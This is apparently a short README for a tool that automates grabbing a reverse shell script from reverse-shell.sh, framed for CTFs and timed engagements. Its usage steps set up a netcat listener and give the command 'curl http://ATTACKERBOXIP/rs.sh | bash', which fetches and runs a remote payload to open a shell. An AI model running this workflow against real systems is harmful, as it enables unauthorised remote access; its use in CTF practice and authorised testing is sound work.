# Auto-RSaaS
Automated the usage of https://reverse-shell.sh/


 _  .-')    .-')     ('-.       ('-.      .-')    
( \( -O )  ( OO ).  ( OO ).-.  ( OO ).-. ( OO ).  
 ,------. (_)---\_) / . --. /  / . --. /(_)---\_) 
 |   /`. '/    _ |  | \-.  \   | \-.  \ /    _ |  
 |  /  | |\  :` `..-'-'  |  |.-'-'  |  |\  :` `.  
 |  |_.' | '..`''.)\| |_.'  | \| |_.'  | '..`''.) 
 |  .  '.'.-._)   \ |  .-.  |  |  .-.  |.-._)   \ 
 |  |\  \ \       / |  | |  |  |  | |  |\       / 
 `--' '--' `-----'  `--' `--'  `--' `--' `-----'  


=====================================================================================================================================================

Esentially this project automates the usage of the site https://reverse-shell.sh/. Typically during CTFs or even any timed engagements reverse shells are needed. There are two scripts located in the project the first being rs.sh which is just the reverse shell script grabbed from https://reverse-shell.sh/. Then we have gen.sh this is a script I wrote to grab the rs.sh file and edit its components.

Set Up
======================================================================================================================================================

1. Download the git project into your home folder /home/yourname/RSaaS/
2. Edit the contents of gen.sh to copy the rs.sh from your own home folder.
3. Setup a alias in bash to run rsaas something like rsaas= bash /home/harshil/rsaas/gen.sh

Usage
======================================================================================================================================================
1. run rsaas enter your port that you will listen on
2. setup a webserver where the rs.sh file is hosted (updog -p 80)
3. in another window run nc -nvlp 4444 (substitute 4444 which the port you are listening on)
4. use curl http://ATTACKERBOXIP/rs.sh | bash when attempting to use command execution
